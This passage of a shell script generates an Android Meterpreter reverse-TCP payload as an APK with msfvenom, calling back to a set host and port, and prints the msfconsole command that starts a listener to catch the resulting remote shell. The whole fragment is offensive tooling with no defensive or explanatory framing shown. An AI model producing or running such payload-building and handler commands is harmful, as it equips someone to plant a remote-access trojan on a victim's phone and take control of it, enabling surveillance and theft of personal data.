...
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -o payload.apk

echo '[+] Payload generated in payloads/android/'
echo '[+] Use: msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 8888; exploit"'
